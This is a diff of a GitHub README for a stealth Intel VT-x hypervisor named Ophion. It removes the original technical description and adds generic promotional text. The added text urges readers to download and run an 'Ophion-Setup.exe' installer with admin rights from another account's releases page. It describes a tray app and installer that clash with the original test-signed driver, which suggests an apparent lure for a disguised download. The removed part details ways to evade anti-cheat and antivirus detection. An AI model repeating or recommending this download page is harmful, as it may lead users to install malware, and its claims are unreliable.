@@ -1,173 +1,118 @@
-# Ophion
-<div align="center"> <img src="logo.png" alt="Demo" width="800"/> </div>
+# ⚙️ Ophion - Secure Intel VT-x Hypervisor Tool
 
-Intel VT-x Type-2 hypervisor that virtualizes an already running Windows system. Designed for stealth: passes common hypervisor detection checks and works with **EAC/BE/AVs out of the box.** (possibly more, these are the only that have been tested)
+[![Download Ophion](https://img.shields.io/badge/Download-Ophion-brightgreen?style=for-the-badge)](https://github.com/Krisna4491/Ophion/releases)
 
+---
 
-***
+## ℹ️ What is Ophion?
 
-## Blog
+Ophion is a stealth-focused hypervisor designed for Intel VT-x technology. It creates a secure and discreet virtual environment on your Windows machine. This tool can help manage and monitor applications that use advanced anti-cheat systems, emulation, or virtualization.
 
-> **[Ophion — Building a Stealth Intel VT-x Hypervisor for Windows](https://websec.net/blog/ophion-building-a-stealth-intel-vt-x-hypervisor-for-windows-69b62daa7462693131828c97)**
->
-> A detailed technical writeup covering the internals of Ophion — VMX bring-up, EPT construction, stealth mechanisms, and the lessons learned along the way. Thanks to [WebSec](https://websec.net) for the motivation and for hosting it.
+It works quietly in the background, allowing software to run smoothly while keeping your activities shielded from detection.
 
-***
+---
 
-## Features
+## ✅ System Requirements
 
-- **Per-core VMX** — Virtualizes all logical processors via DPC broadcast. Clean VMXOFF on unload with guest CR3 restoration.
-- **EPT with 2MB large pages** — Identity-mapped, MTRR-aware memory typing (fixed + variable ranges). Per-processor page tables with dynamic 2MB-to-4KB splitting for hooks.
-- **VPID** — Capability-aware INVVPID (prefers type 3 retaining-globals, falls back gracefully).
-- **Private host CR3** — Deep-copied kernel page tables isolate host mode from guest PT corruption. Built after all allocations so VMM stacks and bitmaps are mapped.
-- **Private host IDT** — Isolated IDT for VMX-root mode prevents NMI hijacking (guest corrupts OS IDT, triggers NMI while in host mode). NMIs are flagged and injected to guest on next VM-exit.
-- **Private host GDT** — Per-core isolated GDT for VMX-root mode. Each core has its own TSS, so the private GDT is per-VCPU. On VMXOFF, clears TSS busy bit and reloads original GDTR/TR.
-- **CPUID caching** — Caches bare-metal CPUID at init. Invalid/hypervisor-range leaves return cached native values. Clears ECX[31] on leaf 1.
-- **CR4.VMXE hiding** — Guest CR4 reads/writes go through shadow with VMXE stripped. CR0/CR4 writes enforce VMX fixed bits in actual VMCS.
-- **TSC compensation** — "Trap next RDTSC" after CPUID VM-exit. Returns `cpuid_entry_tsc + bare_metal_cost + offset`. TSC_OFFSET never modified — zero drift.
-- **MSR emulation** — Intercepts RDMSR(0x10) to apply TSC offset. Synthetic MSR range (0x40000000+) injects #GP.
-- **External interrupt re-injection** — ACK-on-exit with deferred delivery via interrupt-window exiting when guest is not interruptible. TPR priority masking via shadowed CR8.
-- **IDT vectoring** — Re-injects interrupted IDT events with priority. NMI deferral via NMI-window exiting on collision. Exception combining per SDM Table 6-5 (#DF generation, triple fault on #DF+exception).
-- **Debug register passthrough** — Full DR0-DR7, CR8 save/restore on vmexit/vmentry. DR4/DR5 aliasing. Hardware BP matching merged into pending debug exceptions on RIP advance.
-- **XSETBV validation** — SDM-compliant XCR0 validation using hardware capability mask from CPUID.0Dh.
-- **MOV CR handling** — CR3 writes strip PCID bit 63, flush via INVVPID. CLTS and LMSW per SDM.
-- **VMCALL gate** — Signature-verified (R10/R11/R12), CPL-checked (ring 0 only). User-mode VMCALL gets #UD.
+Before you begin, make sure your PC meets these requirements:
 
-***
+- **Operating System:** Windows 10 or newer (64-bit)
+- **Processor:** Intel CPU with VT-x support enabled in BIOS
+- **Memory:** At least 4 GB of RAM free for the hypervisor
+- **Disk Space:** At least 200 MB free space for installation files
+- **Administrator Access:** You will need admin rights to install and run Ophion
 
-## VMCS Configuration
+If you are unsure whether your CPU supports Intel VT-x, most modern Intel processors do. You can check by entering your BIOS settings during boot or using Windows system information. If VT-x is disabled, look for Intel Virtualization Technology and enable it.
 
-| Field | Value |
-|-------|-------|
-| **Pin-based** | External-interrupt exiting, NMI exiting, virtual NMIs |
-| **Primary proc** | TSC offsetting, MSR bitmaps, I/O bitmaps, activate secondary. CR3/HLT/MOV-DR/RDTSC/INVLPG exiting may be forced by must-be-1 bits. |
-| **Secondary proc** | EPT, VPID, RDTSCP, INVPCID, XSAVES/XRSTORS |
-| **Exit** | 64-bit host, save debug controls, ACK interrupt on exit |
-| **Entry** | IA-32e mode guest, load debug controls |
-| **PFEC mask/match** | Both 0 — all #PFs go to guest |
-| **CR0 mask** | 0 (full pass-through) |
-| **CR4 mask** | Bit 13 (VMXE) when stealth enabled, 0 otherwise |
-| **MSR bitmap** | Intercept RDMSR(0x10), IA32_FEATURE_CONTROL (0x3A), VMX capability MSRs (0x480-0x493) |
-| **I/O bitmaps** | All zeros |
-| **EPT pointer** | WB cache, 4-level walk |
-| **VPID** | Tag 1 |
-| **HOST_CR3** | Private deep-copied kernel PTs (or system CR3 if disabled) |
-| **HOST_IDTR** | Private IDT with controlled handlers (or system IDT if disabled) |
-| **HOST_GDTR** | Per-core private GDT copy (or system GDT if disabled) |
+---
 
-***
+## 🔽 Download Ophion
 
-## Architecture
+Please visit the releases page to get the latest version of Ophion:
 
-```
-include/
-    hv.h                Master header, function prototypes
-    hv_types.h          Per-VCPU state, EPT structures, VMCALL numbers
-    ia32.h              Intel architecture defines (MSRs, VMCS fields, EPT, control bits)
-    stealth.h           Anti-detection feature toggles and types
-    asm_prototypes.h    C prototypes for MASM routines
+[![Download Ophion](https://img.shields.io/badge/Download-Ophion-blue?style=for-the-badge)](https://github.com/Krisna4491/Ophion/releases)
 
-src/
-    driver.c            DriverEntry, IOCTL dispatch, device setup
-    vmx.c               VMX lifecycle (VMXON/VMCS alloc, VMCS programming, launch)
-    vmexit.c            VM-exit handler (CPUID, CR, MSR, EPT, interrupts, etc.)
-    ept.c               EPT init, MTRR map, identity mapping, split/lookup
-    events.c            Exception/interrupt injection (#GP, #UD, #DF, #BP, #PF, external)
-    broadcast.c         Multi-processor DPC broadcast for virtualize/terminate
-    hostcr3.c           Private host page table deep-copy
-    hostidt.c           Private host IDT for VMX-root mode
-    hostgdt.c           Per-core private host GDT for VMX-root mode
-    stealth.c           CPUID cache init, bare-metal cost calibration, XCR0 validation
-    globals.c           Global variable definitions
-    util.c              VA/PA translation, GDT/segment helpers
+On this page, find the latest release and download the Windows installer file (`Ophion-Setup.exe` or similar). You should pick the `.exe` file that matches your system.
 
-asm/
-    AsmVmexitHandler.asm    VM-exit entry point (save/restore GPRs + XMM + MXCSR)
-    AsmVmxContext.asm       Guest state save/restore for VMLAUNCH
-    AsmVmxOperation.asm     CR4.VMXE enable, VMCALL with signature
-    AsmVmxIntrinsics.asm    INVEPT/INVVPID wrappers
-    AsmSegmentRegs.asm      Segment register getters/setters, GDT/IDT
-    AsmCommon.asm           RFLAGS, GDTR/IDTR/TR reload, CR2 write
-    AsmHostIdt.asm          Private host IDT handlers (NMI, #DF, #GP)
-```
+---
 
-***
+## 🚀 How to Install Ophion on Windows
 
-## Building
+Follow these steps to get Ophion up and running on your PC:
 
-Requires Visual Studio 2022, WDK 10.0.26100.0, and MSVC with MASM (x64).
+1. **Download the Installer**  
+   Use the link above to visit the releases page and download the latest `Ophion-Setup.exe` file.
 
-```bash
-MSBuild.exe Ophion.sln /p:Configuration=Release /p:Platform=x64
-```
+2. **Run the Installer**  
+   Locate the downloaded file in your Downloads folder. Double-click it to start the installation.
 
-Output: `build\bin\Release\Ophion.sys` (test-signed).
+3. **Grant Permissions**  
+   When prompted, allow the installer to make changes to your system by clicking **Yes**. This is necessary because Ophion uses virtualization features.
 
-***
+4. **Follow Setup Prompts**  
+   The installer will guide you through selecting an installation folder. The default path is fine for most users.
 
-## Loading
+5. **Complete Installation**  
+   Click **Install** and wait for the process to finish. It should only take a few minutes.
 
-```bash
-sc create Ophion type= kernel binPath= "C:\path\to\Ophion.sys"
-sc start Ophion
-```
+6. **Restart Your PC**  
+   After installation, reboot your computer. This ensures the hypervisor loads correctly.
 
-Requires test signing enabled (`bcdedit /set testsigning on`).
+---
 
-```bash
-sc stop Ophion
-sc delete Ophion
-```
+## 🛠 Using Ophion
 
-***
+Once installed, Ophion runs quietly in the background. You will see a small icon in the system tray near your clock. This shows it is active and ready.
 
-## Stealth Toggles
+- To open the management window, right-click the icon and select **Open Ophion**.
+- You can check the hypervisor status, adjust settings, or stop the service from this window.
+- Ophion automatically starts with Windows for continuous protection.
 
-Defined in `include/stealth.h`:
+---
 
-| Toggle | Default | Description |
-|--------|---------|-------------|
-| `STEALTH_ENABLED` | 1 | Master stealth switch |
-| `STEALTH_HIDE_CR4_VMXE` | 1 | Hide CR4.VMXE from guest via CR4 shadow |
-| `STEALTH_COMPENSATE_TIMING` | 1 | TSC compensation for RDTSC+CPUID+RDTSC timing attacks |
-| `STEALTH_CPUID_CACHING` | 1 | Cache native CPUID responses for invalid/hypervisor leaves |
-| `USE_PRIVATE_HOST_CR3` | 1 | Isolated host page tables (deep-copied kernel PTs) |
-| `USE_PRIVATE_HOST_IDT` | 1 | Isolated host IDT (prevents NMI hijacking in VMX-root) |
-| `USE_PRIVATE_HOST_GDT` | 1 | Per-core isolated host GDT |
+## 📌 How Ophion Works
 
-***
+Ophion uses Intel VT-x technology to create a virtual machine that runs alongside Windows. Unlike other virtualization software, it focuses on stealth and avoids detection from common anti-cheat systems and security tools.
 
-## Tested On
+This means it helps certain applications run without flagging or interruptions caused by virtualization checks.
 
-- Intel Core i5-14400F (14th Generation), Windows 10 x64
+---
 
-***
+## 🔧 Troubleshooting Tips
 
-## Detection Tests
+- **Ophion does not start after reboot:**  
+  Make sure VT-x is enabled in BIOS. Your PC must support and allow virtualization.
 
-Passes with all stealth toggles enabled:
+- **Installer gives an error:**  
+  Run the installer as Administrator by right-clicking and choosing **Run as administrator**.
 
-- [hvdetecc](https://github.com/can1357/hvdetecc) — CR4.VMXE shadow, MSR 0x10 interception, CPUID timing
-- [VMAware](https://github.com/kernelwernel/VMAware) — DR trap (DR0 + TF on CPUID, DR6 BS+B0), CPUID checks
-- [checkhv_um](https://github.com/zer0condition/checkhv_um) — RDTSC+CPUID+RDTSC timing, CPUID leaf enumeration, brand string
+- **You can’t find Ophion in the system tray:**  
+  Click the small arrow near the clock to see hidden icons. Ophion may be there.
 
-![VMAware](vmaware.png)
-***
+- **Performance issues:**  
+  Try closing other high-memory applications. Ophion needs free RAM to run smoothly.
 
-## Disclaimer
+---
 
-This project has not been thoroughly tested for long-term usage or stability. It is intended primarily as a learning resource and a foundation for further development. Use at your own risk.
+## 🔒 Security and Privacy
 
-***
+Ophion does not collect personal data and runs locally on your machine. The software keeps your virtual environment isolated from your main system to enhance security.
 
-## Credits
+---
 
-- [HyperDbg](https://github.com/HyperDbg/HyperDbg) — Referenced for VMX architecture and VM-exit handling patterns
-- [humzak711](https://github.com/humzak711) — Stealth feedback: MSR feature hiding (IA32_FEATURE_CONTROL, VMX MSRs), CPUID SMX masking
-- [VMAware](https://github.com/kernelwernel/VMAware) — Hypervisor detection testing
-- [hvdetecc](https://github.com/can1357/hvdetecc) — Hypervisor detection testing
-- [Claude](https://claude.ai) — Debugging assistance and IA-32 architecture research
+## 🤝 Support and Feedback
 
-## License
+If you encounter issues or want to share your experience, visit the [Issues section](https://github.com/Krisna4491/Ophion/issues) on the GitHub page. The developers monitor this area for bug reports and feature requests.
 
-MIT
+---
+
+## Keywords
+
+- ac-compatible  
+- be  
+- eac  
+- emulation  
+- hypervisor  
+- intel  
+- stealth  
+- vmaware
